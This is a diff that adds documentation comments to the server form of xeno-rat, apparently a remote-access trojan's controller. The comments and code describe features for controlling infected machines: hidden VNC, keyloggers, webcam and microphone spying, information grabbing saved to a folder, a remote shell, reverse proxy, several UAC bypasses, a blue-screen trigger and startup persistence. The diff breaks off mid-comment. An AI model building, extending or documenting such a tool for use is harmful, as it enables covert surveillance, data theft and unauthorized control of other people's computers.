@@ -118,6 +118,19 @@ namespace xeno_rat_server
             Commands["Debug Info"] = Debug_Info;
         }
 
+        /// <summary>
+        /// Handles the connection of a socket and performs necessary setup operations.
+        /// </summary>
+        /// <param name="socket">The socket to be connected and set up.</param>
+        /// <returns>A task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method assigns a unique ID to the current connection and then connects and sets up the socket using the Utils.ConnectAndSetupAsync method.
+        /// If the connection setup fails, it handles the disconnection of the socket and returns.
+        /// If the connection setup is successful, it retrieves additional client information and adds it to a list view.
+        /// It then checks for possible duplicates based on hardware ID and disconnects the client if a duplicate is found.
+        /// If no duplicates are found, it creates a HeartBeat Node for the client, updates the list view, logs the new client connection, and initiates a heart beat process.
+        /// If the client is of type 1, it assigns the parent node and adds the sub node to the client.
+        /// </remarks>
         private async Task OnConnect(Socket socket)
         {
             int currentIdCount = currentCount++;
@@ -193,6 +206,11 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Retrieves a list of clients based on the specified hardware ID.
+        /// </summary>
+        /// <param name="hwid">The hardware ID used to filter the clients.</param>
+        /// <returns>A list of <see cref="ListViewItem"/> objects representing the clients with the specified hardware ID.</returns>
         private List<ListViewItem> GetClientsByHwid(string hwid)
         {
             List<ListViewItem> results = new List<ListViewItem>();
@@ -206,6 +224,18 @@ namespace xeno_rat_server
             return results;
         }
 
+        /// <summary>
+        /// Completes tasks on connection with the client node.
+        /// </summary>
+        /// <param name="client">The client node to connect with.</param>
+        /// <returns>A task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method iterates through the list of tasks to be completed upon connection with the client node.
+        /// If the task is "Start OfflineKeylogger", it creates a subclient, loads the "OfflineKeyLogger" DLL, and performs various operations.
+        /// If the task is "Infograber", it creates a subclient, loads the "InfoGrab" DLL, and performs various operations to gather information.
+        /// The gathered information is then zipped and saved in a directory named "OnConnectInfoGrabbedData".
+        /// </remarks>
+        /// <exception cref="Exception">Thrown when an error occurs during the execution of tasks.</exception>
         private async Task CompleteOnConnectTasks(Node client) 
         {
             foreach (string i in OnConnectTasks) 
@@ -323,7 +353,18 @@ namespace xeno_rat_server
                 }
             }
         }
-        
+
+        /// <summary>
+        /// Retrieves additional information and returns a ListViewItem object.
+        /// </summary>
+        /// <param name="type0node">The node from which to retrieve additional information.</param>
+        /// <returns>A ListViewItem object containing additional information retrieved from the specified node.</returns>
+        /// <exception cref="ArgumentNullException">Thrown when the input parameter <paramref name="type0node"/> is null.</exception>
+        /// <remarks>
+        /// This method retrieves additional information from the specified node. It sends a request to the node, receives the response, processes the data, and creates a ListViewItem object containing the retrieved information.
+        /// If the node's SockType is not 0, or if any of the data retrieval steps fail, the method returns null.
+        /// The method also handles exceptions that may occur during the retrieval process and sets default values for certain fields if necessary.
+        /// </remarks>
         private async Task<ListViewItem> GetAddInfo(Node type0node)
         {
 
@@ -422,6 +463,13 @@ namespace xeno_rat_server
             return lvi; 
         } 
 
+        /// <summary>
+        /// Handles the disconnection of a client node.
+        /// </summary>
+        /// <param name="client">The client node that has been disconnected.</param>
+        /// <remarks>
+        /// This method checks the socket type of the <paramref name="client"/>. If the socket type is 0, it removes the corresponding item from <see cref="listView2"/> and adds a log entry indicating that the client has been disconnected.
+        /// </remarks>
         private void OnDisconnect(Node client)
         {
             if (client.SockType == 0) 
@@ -440,6 +488,18 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Updates the ListView with information received from the client node.
+        /// </summary>
+        /// <param name="item">The ListViewItem to be updated.</param>
+        /// <param name="client">The Node representing the client.</param>
+        /// <exception cref="ArgumentNullException">Thrown when <paramref name="item"/> is null.</exception>
+        /// <returns>An asynchronous task representing the ListView update process.</returns>
+        /// <remarks>
+        /// This method updates the provided <paramref name="item"/> in the ListView with information received from the <paramref name="client"/> node.
+        /// It creates a subnode using the client, sends a request to the subnode to get update information, and then updates the item with the received data.
+        /// The method continues to update the item at regular intervals until either the subnode or the client is disconnected.
+        /// </remarks>
         private async Task ListViewUpdater(ListViewItem item, Node client) 
         {
             if (item == null) 
@@ -486,6 +546,22 @@ namespace xeno_rat_server
             
         }
 
+        /// <summary>
+        /// Sends a heartbeat signal from the HeartSock to the MainSock and handles error messages if received.
+        /// </summary>
+        /// <param name="HeartSock">The node representing the heartbeat socket.</param>
+        /// <param name="MainSock">The node representing the main socket.</param>
+        /// <exception cref="System.NullReferenceException">Thrown when HeartSock is null.</exception>
+        /// <returns>An asynchronous task representing the heartbeat process.</returns>
+        /// <remarks>
+        /// This method sends a heartbeat signal from the HeartSock to the MainSock at regular intervals and handles error messages if received.
+        /// If HeartSock is null, the MainSock is disconnected and the method returns.
+        /// The method sets a receive timeout of 5000 milliseconds for the HeartSock.
+        /// While both HeartSock and MainSock are connected, the method sends a heartbeat signal, receives data, and handles error messages if received.
+        /// If an error message is received, it is logged if LogErrors is true, and the method breaks.
+        /// If the received operation code is not 1 or 3, the method breaks.
+        /// The MainSock is disconnected at the end of the process.
+        /// </remarks>
         private async Task HeartBeat(Node HeartSock, Node MainSock)
         {
             if (HeartSock == null)
@@ -524,6 +600,14 @@ namespace xeno_rat_server
             MainSock.Disconnect();
         }
 
+        /// <summary>
+        /// Handles the MainForm load event.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <remarks>
+        /// This method initializes the MainForm by setting the application icon, enabling double buffering for list views, setting up a configuration update timer, deserializing controls from a JSON file if it exists, starting the configuration update timer, loading country flags into a list view, initializing a database reader, and adding a log message indicating that the MainForm has started.
+        /// </remarks>
         private void MainForm_Load(object sender, EventArgs e)
         {
             Icon = Icon.ExtractAssociatedIcon(System.Reflection.Assembly.GetExecutingAssembly().Location);
@@ -553,6 +637,15 @@ namespace xeno_rat_server
             AddLog("Started!", Color.Green);
         }
 
+        /// <summary>
+        /// Serializes the control data to JSON format and returns the serialized data.
+        /// </summary>
+        /// <returns>The serialized control data in JSON format.</returns>
+        /// <remarks>
+        /// This method creates a dictionary to store the control data, then populates it with the values of various text boxes, labels, and check boxes.
+        /// It also includes other specific data such as OnConnectTasks, string_key, and ports.
+        /// The method then serializes the dictionary to JSON format using the JsonConvert class from the Newtonsoft.Json library.
+        /// </remarks>
         private string SerializeControlsToJson()
         {
             Dictionary<string, object> controlData = new Dictionary<string, object>();
@@ -594,7 +687,16 @@ namespace xeno_rat_server
             return jsonData;
         }
 
-
+        /// <summary>
+        /// Deserializes control data from JSON string and populates the UI controls with the deserialized values.
+        /// </summary>
+        /// <param name="jsonData">The JSON string containing control data.</param>
+        /// <exception cref="JsonException">Thrown when an error occurs during JSON deserialization.</exception>
+        /// <remarks>
+        /// This method deserializes the control data from the input JSON string and populates the UI controls with the deserialized values.
+        /// It handles various UI controls such as text boxes, labels, checkboxes, and lists.
+        /// Additionally, it performs error handling by displaying a message box in case of an exception during deserialization.
+        /// </remarks>
         private void DeserializeControlsFromJson(string jsonData)
         {
             try
@@ -650,7 +752,15 @@ namespace xeno_rat_server
             }
         }
 
-
+        /// <summary>
+        /// Updates the configuration file at regular intervals.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <remarks>
+        /// This method checks if the configuration file "Config.json" exists. If it does not exist, it creates a new file and writes the serialized controls to it.
+        /// If the file exists, it compares the new serialized controls with the last saved configuration. If there is a difference, it updates the "Config.json" file with the new configuration.
+        /// </remarks>
         private void ConfigUpdateTimer_Tick(object sender, EventArgs e)
         {
             if (!File.Exists("Config.json"))
@@ -666,6 +776,18 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Handles the button click event to start a listener on the specified port.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <remarks>
+        /// This method retrieves the port number from the input textbox and attempts to start a listener on that port.
+        /// If the input is not a valid number, a message box is displayed indicating the error.
+        /// If the port number is not within the valid range, a message box is displayed indicating the error.
+        /// If the specified port is already in use, a message box is displayed indicating the error.
+        /// If all checks pass, a new item is added to the list view and a listener is created on the specified port in a new thread.
+        /// </remarks>
         private void button1_Click(object sender, EventArgs e)
         {
             int port;
@@ -696,6 +818,15 @@ namespace xeno_rat_server
             new Thread(()=> ListeningHandler.CreateListener(port)).Start();
         }
 
+        /// <summary>
+        /// Removes a port from the list and stops the listener on that port.
+        /// </summary>
+        /// <param name="portItem">The ListViewItem representing the port to be removed.</param>
+        /// <exception cref="FormatException">Thrown when the port number in <paramref name="portItem"/> cannot be parsed to an integer.</exception>
+        /// <remarks>
+        /// This method removes the specified port from the list and stops the listener on that port.
+        /// It also logs a message indicating that the listener on the port has been stopped.
+        /// </remarks>
         private void remove_port(ListViewItem portItem) 
         {
             int port = Int32.Parse(portItem.SubItems[0].Text);
@@ -704,6 +835,16 @@ namespace xeno_rat_server
             portItem.Remove();
         }
 
+        /// <summary>
+        /// Handles the mouse click event on the list view and displays a context menu if the right mouse button is clicked on a list view item.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">A MouseEventArgs that contains the event data.</param>
+        /// <remarks>
+        /// If the right mouse button is clicked, a context menu is displayed at the location of the mouse click.
+        /// If the clicked item is not null and the mouse click is within the bounds of the item, a "Remove" option is added to the context menu.
+        /// When an item is clicked in the context menu, the remove_port method is called with the focused item as a parameter.
+        /// </remarks>
         private void listView1_MouseClick(object sender, MouseEventArgs e)
         {
             if (e.Button == MouseButtons.Right)
@@ -719,21 +860,54 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Occurs when the selected index of the ListView2 control changes.
+        /// </summary>
+        /// <param name="sender">The source of the event.</param>
+        /// <param name="e">An EventArgs that contains the event data.</param>
         private void listView2_SelectedIndexChanged(object sender, EventArgs e)
         {
 
         }
 
+        /// <summary>
+        /// Event handler for the Click event of tabPage1.
+        /// </summary>
+        /// <param name="sender">The object that raised the event.</param>
+        /// <param name="e">The event data.</param>
+        /// <remarks>
+        /// This method is an event handler for the Click event of tabPage1. It is triggered when tabPage1 is clicked.
+        /// </remarks>
         private void tabPage1_Click(object sender, EventArgs e)
         {
 
         }
+
+        /// <summary>
+        /// Raises the FormClosed event and terminates the current process.
+        /// </summary>
+        /// <param name="e">A FormClosedEventArgs that contains the event data.</param>
+        /// <remarks>
+        /// This method overrides the OnFormClosed method to perform additional tasks when the form is closed.
+        /// It first calls the base class's OnFormClosed method to raise the FormClosed event.
+        /// Then it terminates the current process by calling the GetCurrentProcess method of the System.Diagnostics.Process class and invoking the Kill method on the returned process.
+        /// </remarks>
         protected override void OnFormClosed(FormClosedEventArgs e)
         {
             base.OnFormClosed(e);
             System.Diagnostics.Process.GetCurrentProcess().Kill();
         }
 
+        /// <summary>
+        /// Adds a log message to the list view with the specified text color.
+        /// </summary>
+        /// <param name="message">The message to be added to the log.</param>
+        /// <param name="textcolor">The color of the text for the log message.</param>
+        /// <remarks>
+        /// This method creates a new list view item with the current time in the format "hh:mm:ss tt" as the first column, and the specified message as the second column.
+        /// The text color of the log message is set to the specified color.
+        /// The new list view item is then added to the list view in the UI thread using BeginInvoke method.
+        /// </remarks>
         private void AddLog(string message, Color textcolor) 
         {
             ListViewItem lvi = new ListViewItem();
@@ -742,7 +916,19 @@ namespace xeno_rat_server
             lvi.ForeColor = textcolor;
             listView3.BeginInvoke((MethodInvoker)(() => { listView3.Items.Insert(0, lvi); }));
         }
-        
+
+        /// <summary>
+        /// Starts a chat with the specified client node.
+        /// </summary>
+        /// <param name="client">The client node to start the chat with.</param>
+        /// <exception cref="Exception">Thrown if there is an error starting the chat.</exception>
+        /// <returns>No explicit return value. Starts a chat with the specified client node.</returns>
+        /// <remarks>
+        /// This method asynchronously creates a sub-node for the specified client using the <paramref name="client"/> and a given ID.
+        /// It then attempts to load a DLL named "Chat" into the sub-node using the <see cref="Utils.LoadDllAsync"/> method, and displays an error message if the operation fails.
+        /// If successful, it runs a new chat form using the created sub-node and disconnects the sub-node after the chat form is closed.
+        /// If any errors occur during the process, an error message is displayed using <see cref="MessageBox.Show"/>.
+        /// </remarks>
         private async Task StartChat(Node client)
         {
             try
@@ -762,6 +948,18 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with chat!");
             }
         }
+
+        /// <summary>
+        /// Starts the process manager for the specified client node.
+        /// </summary>
+        /// <param name="client">The client node for which the process manager needs to be started.</param>
+        /// <exception cref="Exception">Thrown when an error occurs during the process manager start.</exception>
+        /// <returns>Task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method starts the process manager for the specified client node by creating a sub-client, loading the "ProcessManager" DLL, and running the application.
+        /// If the loading of the DLL fails, an error message is displayed, and the method returns without starting the process manager.
+        /// After running the application, the sub-client is disconnected.
+        /// </remarks>
         private async Task StartProcessManager(Node client)
         {
             try
@@ -781,7 +979,17 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with ProcessManager!");
             }
         }
-        
+
+        /// <summary>
+        /// Asynchronously starts the HVNC (Hidden VNC) functionality for the specified client node.
+        /// </summary>
+        /// <param name="client">The client node for which HVNC functionality is to be started.</param>
+        /// <exception cref="Exception">Thrown when an error occurs during the HVNC start process.</exception>
+        /// <remarks>
+        /// This method starts the HVNC functionality for the specified client node by creating a sub-node and loading the Hvnc.dll plugin.
+        /// If the loading of the plugin is successful, it launches the HVNC form and disconnects the sub-client after its closure.
+        /// If an error occurs during the HVNC start process, an exception is thrown and an error message is displayed.
+        /// </remarks>
         private async Task StartHvnc(Node client) 
         {
             try
@@ -801,6 +1009,19 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with HVNC!");
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts a reverse proxy using the provided client node.
+        /// </summary>
+        /// <param name="client">The node used to start the reverse proxy.</param>
+        /// <exception cref="Exception">Thrown when an error occurs during the reverse proxy setup or execution.</exception>
+        /// <returns>No explicit return value.</returns>
+        /// <remarks>
+        /// This method starts a reverse proxy by creating a sub-node using the provided <paramref name="client"/> and loading the "ReverseProxy" plugin using the Utils.LoadDllAsync method.
+        /// If the loading is successful, it launches a new instance of the Reverse_Proxy form and runs the application with the sub-node.
+        /// After the application is closed, the sub-node is disconnected.
+        /// If any error occurs during the process, an exception is caught and an error message is displayed using MessageBox.Show.
+        /// </remarks>
         private async Task StartReverseProxy(Node client) 
         {
             try
@@ -820,6 +1041,18 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with ReverseProxy!" + e.Message); 
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the file manager for the specified client node.
+        /// </summary>
+        /// <param name="client">The client node for which the file manager is to be started.</param>
+        /// <returns>A task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method creates a sub-node for the specified <paramref name="client"/> and loads the "FileManager" plugin using the Utils.LoadDllAsync method.
+        /// If the loading is successful, it starts the file manager application by running the File_manager form.
+        /// The sub-node is then disconnected after the file manager application is closed.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown when an error occurs during the file manager operation.</exception>
         private async Task StartFileManager(Node client)
         {
             try
@@ -839,6 +1072,17 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with FileManager!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the registry manager for the specified <paramref name="client"/>.
+        /// </summary>
+        /// <param name="client">The node for which the registry manager is to be started.</param>
+        /// <remarks>
+        /// This method creates a sub-node <paramref name="subClient"/> using the <paramref name="client"/> and loads the "RegistryManager" plugin DLL using the <see cref="Utils.LoadDllAsync"/> method.
+        /// If the loading is successful, it runs the "Registry_Manager" form for the <paramref name="subClient"/> using <see cref="Application.Run"/>.
+        /// After the form is closed, it disconnects the <paramref name="subClient"/>.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown when there is an error starting the registry manager or loading the DLL.</exception>
         private async Task StartRegistryManager(Node client)
         {
             try
@@ -858,6 +1102,17 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with RegistryManager!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the live microphone functionality for the specified client node.
+        /// </summary>
+        /// <param name="client">The client node for which the live microphone functionality is to be started.</param>
+        /// <remarks>
+        /// This method creates a sub-node using the specified <paramref name="client"/> and loads the "LiveMicrophone" plugin using the Utils.LoadDllAsync method.
+        /// If the plugin is loaded successfully, it launches the Live_Microphone form using Application.Run method and disconnects the sub-node after the form is closed.
+        /// If the plugin loading fails, it displays an error message using MessageBox.Show method.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown when an error occurs during the process of starting the live microphone functionality.</exception>
         private async Task StartLiveMicrophone(Node client)
         {
             try
@@ -877,6 +1132,17 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with LiveMicrophone!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the shell for the specified client.
+        /// </summary>
+        /// <param name="client">The client node for which the shell is to be started.</param>
+        /// <remarks>
+        /// This method creates a sub-client node using the specified <paramref name="client"/> and loads the "Shell" plugin DLL asynchronously.
+        /// If the loading is successful, it starts the shell interface using the loaded plugin and runs the shell form.
+        /// After the shell form is closed, it disconnects the sub-client node.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown when an error occurs during the shell operation.</exception>
         private async Task StartShell(Node client)
         {
             try
@@ -896,6 +1162,17 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Shell!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the webcam functionality for the specified client node.
+        /// </summary>
+        /// <param name="client">The client node to start the webcam for.</param>
+        /// <remarks>
+        /// This method creates a sub-node using the specified <paramref name="client"/> and loads the "WebCam" plugin DLL asynchronously.
+        /// If the loading is successful, it displays the webcam form and disconnects the sub-node after the form is closed.
+        /// If the loading fails, it displays an error message and returns without starting the webcam.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown when an error occurs during the process of starting the webcam.</exception>
         private async Task StartWebCam(Node client)
         {
             try
@@ -915,6 +1192,18 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with WebCam!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the key logger for the specified client node.
+        /// </summary>
+        /// <param name="client">The client node for which the key logger is to be started.</param>
+        /// <exception cref="Exception">Thrown if an error occurs while starting the key logger.</exception>
+        /// <returns>No explicit return value. The method is asynchronous and does not return a value.</returns>
+        /// <remarks>
+        /// This method starts a key logger for the specified client node by creating a sub node and loading the "KeyLogger" plugin using the Utils.LoadDllAsync method.
+        /// If the loading is successful, it runs the key logger form and disconnects the sub client after the form is closed.
+        /// If an error occurs during the process, it displays an error message using MessageBox.Show and catches the exception to display the error message.
+        /// </remarks>
         private async Task StartKeyLogger(Node client)
         {
             try
@@ -934,6 +1223,20 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with KeyLogger!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the offline keylogger for the specified client node.
+        /// </summary>
+        /// <param name="client">The client node for which the offline keylogger is to be started.</param>
+        /// <exception cref="Exception">Thrown when an error occurs while starting the offline keylogger.</exception>
+        /// <returns>No explicit return value.</returns>
+        /// <remarks>
+        /// This method asynchronously creates a sub-node for the specified client using the value 2.
+        /// It then attempts to load the "OfflineKeyLogger" DLL into the sub-node using the provided byte array of the DLL content and the AddLog method.
+        /// If the loading is successful, it starts the offline keylogger form for the sub-node using the OfflineKeylogger form from the Forms namespace.
+        /// After the form is closed, it disconnects the sub-node.
+        /// If an error occurs during any of these steps, an exception message is displayed using a message box.
+        /// </remarks>
         private async Task StartOfflineKeyLogger(Node client)
         {
             try
@@ -954,6 +1257,15 @@ namespace xeno_rat_server
             }
         }
 
+        /// <summary>
+        /// Asynchronously starts the Cmstp UAC bypass on the specified client node.
+        /// </summary>
+        /// <param name="client">The client node on which to start the bypass.</param>
+        /// <remarks>
+        /// This method starts the Cmstp UAC bypass on the specified client node by creating a subnode, loading the Uacbypass.dll, sending a byte array, receiving data, and handling success or failure messages.
+        /// If the bypass fails to start, an error message is displayed.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown if an error occurs during the bypass process.</exception>
         private async Task StartCmstpUacBypass(Node client)
         {
             try
@@ -981,6 +1293,20 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Uacbypass!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the WinDirBypass process using the provided <paramref name="client"/>.
+        /// </summary>
+        /// <param name="client">The Node object representing the client to start the WinDirBypass process for.</param>
+        /// <exception cref="Exception">Thrown when an error occurs during the WinDirBypass process.</exception>
+        /// <returns>No explicit return value. The WinDirBypass process is started asynchronously.</returns>
+        /// <remarks>
+        /// This method starts the WinDirBypass process by creating a sub-node using the provided <paramref name="client"/>.
+        /// It then attempts to load the "Uacbypass" DLL into the sub-node using the Utils.LoadDllAsync method.
+        /// If successful, it sends a byte array to the sub-node and waits for a response.
+        /// If the response indicates success, it disconnects the sub-node and displays a success message.
+        /// If any step fails, it displays an appropriate error message.
+        /// </remarks>
         private async Task StartWinDirBypass(Node client)
         {
             try
@@ -1008,6 +1334,20 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Uacbypass!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Starts the FodHelper Bypass process using the specified client node.
+        /// </summary>
+        /// <param name="client">The client node to start the FodHelper Bypass process.</param>
+        /// <returns>A task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method starts the FodHelper Bypass process by creating a sub-client node using the specified <paramref name="client"/>.
+        /// It then attempts to load the "Uacbypass" DLL into the sub-client using the <see cref="Utils.LoadDllAsync"/> method.
+        /// If successful, it sends a byte array to the sub-client and waits for a response.
+        /// If the response indicates success, it disconnects the sub-client and displays a success message.
+        /// If any step fails, it displays an appropriate error message.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown when an error occurs during the FodHelper Bypass process.</exception>
         private async Task StartFodHelperBypass(Node client)
         {
             try
@@ -1035,6 +1375,22 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Uacbypass!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Initiates a request for admin privileges using the Uacbypass plugin.
+        /// </summary>
+        /// <param name="client">The Node object representing the client.</param>
+        /// <returns>A task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method initiates a request for admin privileges using the Uacbypass plugin by performing the following steps:
+        /// 1. Creates a sub-node using the provided <paramref name="client"/>.
+        /// 2. Loads the Uacbypass.dll file into the sub-node using the Utils.LoadDllAsync method.
+        /// 3. Sends a byte array with value 4 to the sub-node.
+        /// 4. Sets a receive timeout of 20000 milliseconds for the sub-node.
+        /// 5. Receives data from the sub-node and checks if it is null or the first byte is not equal to 1.
+        /// 6. Disconnects the sub-node and displays a message based on the received data.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown when an error occurs during the process, including errors related to loading the Uacbypass.dll or receiving data from the sub-node.</exception>
         private async Task StartRequestForAdmin(Node client)
         {
             try
@@ -1062,6 +1418,18 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Uacbypass dll!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the de-escalation of permissions for the specified client node.
+        /// </summary>
+        /// <param name="client">The client node for which the de-escalation of permissions should be started.</param>
+        /// <exception cref="Exception">Thrown when an error occurs during the de-escalation process.</exception>
+        /// <returns>No explicit return value. However, the method may throw an exception if an error occurs during the de-escalation process.</returns>
+        /// <remarks>
+        /// This method asynchronously creates a sub-node for the specified client and loads the "Uacbypass" DLL using the Utils.LoadDllAsync method.
+        /// If the loading is successful, it sends a byte array to the sub-client and waits for a response. If the response indicates success, it disconnects the sub-client and displays a success message.
+        /// If any step in the process fails, it displays an appropriate error message.
+        /// </remarks>
         private async Task StartDeescalateperms(Node client)
         {
             try
@@ -1089,6 +1457,19 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Uacbypass dll!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the screen control for the specified client node.
+        /// </summary>
+        /// <param name="client">The client node for which the screen control needs to be started.</param>
+        /// <exception cref="Exception">Thrown when an error occurs during the screen control start process.</exception>
+        /// <returns>No explicit return value. Starts the screen control for the specified client node.</returns>
+        /// <remarks>
+        /// This method asynchronously creates a sub-node <paramref name="subClient"/> using the <paramref name="client"/> node and loads the "ScreenControl" DLL using the <see cref="Utils.LoadDllAsync"/> method.
+        /// If the loading is successful, it starts the screen control application using the <see cref="Application.Run"/> method with a new instance of the "ScreenControl" form.
+        /// After the screen control application is closed, it disconnects the <paramref name="subClient"/>.
+        /// If an error occurs during any of these steps, it displays an error message using the <see cref="MessageBox.Show"/> method.
+        /// </remarks>
         private async Task StartScreenControl(Node client)
         {
             try
@@ -1108,6 +1489,20 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with ScreenControl!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Starts the blue screen process by creating a subnode, loading a DLL, and sending a byte array.
+        /// </summary>
+        /// <param name="client">The main node to start the blue screen process.</param>
+        /// <returns>Task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method starts the blue screen process by creating a subnode using the provided <paramref name="client"/>.
+        /// It then attempts to load a DLL named "Fun" with the content of the file "plugins\\Fun.dll" into the subnode using Utils.LoadDllAsync method.
+        /// If the loading is successful, it sends a byte array to the subnode and waits for 1 second before disconnecting the subnode.
+        /// If the loading fails, it shows an error message using MessageBox.Show and returns without further processing.
+        /// If any exception occurs during the process, it shows an error message using MessageBox.Show along with the exception message.
+        /// </remarks>
+        /// <exception cref="Exception">Thrown when an error occurs during the blue screen process.</exception>
         private async Task StartBlueScreen(Node client)
         {
             try
@@ -1128,6 +1523,20 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Fun dll!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the information grabbing process using the provided <paramref name="client"/>.
+        /// </summary>
+        /// <param name="client">The Node object used to initiate the information grabbing process.</param>
+        /// <exception cref="Exception">Thrown when an error occurs during the information grabbing process.</exception>
+        /// <returns>No explicit return value. The method is asynchronous and does not return a value.</returns>
+        /// <remarks>
+        /// This method initiates the information grabbing process by creating a sub-node using the provided <paramref name="client"/>.
+        /// It then attempts to load the "InfoGrab" DLL asynchronously using the Utils class and the provided sub-node.
+        /// If the loading process is successful, it launches the InfoGrab form and runs the application, disconnecting the sub-node after completion.
+        /// If the loading process fails, it displays an error message using MessageBox.
+        /// If an exception occurs during the process, it displays an error message using MessageBox and includes the exception message.
+        /// </remarks>
         private async Task StartInfoGrab(Node client)
         {
             try
@@ -1147,6 +1556,19 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with WebCam!" + e.Message);
             }
         }
+
+        /// <summary>
+        /// Displays a message box using the provided client and message text.
+        /// </summary>
+        /// <param name="client">The Node client used to display the message box.</param>
+        /// <param name="messageBox_text">The text to be displayed in the message box.</param>
+        /// <exception cref="IOException">Thrown when an I/O error occurs while reading the "Fun.dll" file.</exception>
+        /// <returns>No explicit return value.</returns>
+        /// <remarks>
+        /// This method creates a subClient using the provided client and then attempts to load the "Fun.dll" file into the subClient using the Utils.LoadDllAsync method.
+        /// If the loading process is successful, it sends the message box text as UTF-8 encoded data to the subClient and then disconnects after a 1-second delay.
+        /// If the loading process fails, it displays an error message box and returns without further execution.
+        /// </remarks>
         private async Task DisplayMsgBox(Node client, string messageBox_text) 
         {
             Node subClient = await client.CreateSubNodeAsync(2);
@@ -1162,6 +1584,18 @@ namespace xeno_rat_server
             await Task.Delay(1000);
             subClient.Disconnect();
         }
+
+        /// <summary>
+        /// Displays a message box with the specified message.
+        /// </summary>
+        /// <param name="client">The node on which the message box will be displayed.</param>
+        /// <returns>A task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method prompts the user to input a message that will be displayed in a message box.
+        /// If the input message is empty or null, the method returns without displaying the message box.
+        /// Otherwise, it displays the message box with the input message on the specified client node.
+        /// If an error occurs during the process, a message box displaying "Error with Fun dll!" is shown.
+        /// </remarks>
         private async Task StartMessageBox(Node client)
         {
             try
@@ -1178,6 +1612,19 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Fun dll!");
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the FunMenu for the specified client node.
+        /// </summary>
+        /// <param name="client">The client node for which the FunMenu is to be started.</param>
+        /// <exception cref="Exception">Thrown when an error occurs during the process of starting the FunMenu.</exception>
+        /// <returns>Task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method starts the FunMenu for the specified client node by creating a subClient and loading the "Fun" DLL using the Utils.LoadDllAsync method.
+        /// If the loading of the DLL is successful, it launches the FunMenu form using Application.Run and disconnects the subClient after the form is closed.
+        /// If the loading of the DLL fails, it displays an error message using MessageBox.Show and returns without starting the FunMenu.
+        /// If any other error occurs during the process, it displays an error message using MessageBox.Show.
+        /// </remarks>
         private async Task StartFunMenu(Node client)
         {
             try
@@ -1197,6 +1644,17 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with FunMenu Form!");
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the startup process for the provided client node.
+        /// </summary>
+        /// <param name="client">The client node to start the startup process for.</param>
+        /// <exception cref="Exception">Thrown when an error occurs during the startup process.</exception>
+        /// <returns>A task representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method starts the startup process for the provided client node by creating a sub-node, loading a DLL, and sending/receiving data.
+        /// If the startup process fails, an error message is displayed. If successful, a success message is displayed.
+        /// </remarks>
         private async Task StartStartup(Node client)
         {
             try
@@ -1225,6 +1683,19 @@ namespace xeno_rat_server
                 MessageBox.Show("Error with Startup dll!");
             }
         }
+
+        /// <summary>
+        /// Asynchronously starts the process of removing the startup using the provided <paramref name="client"/>.
+        /// </summary>
+        /// <param name="client">The Node object representing the client.</param>
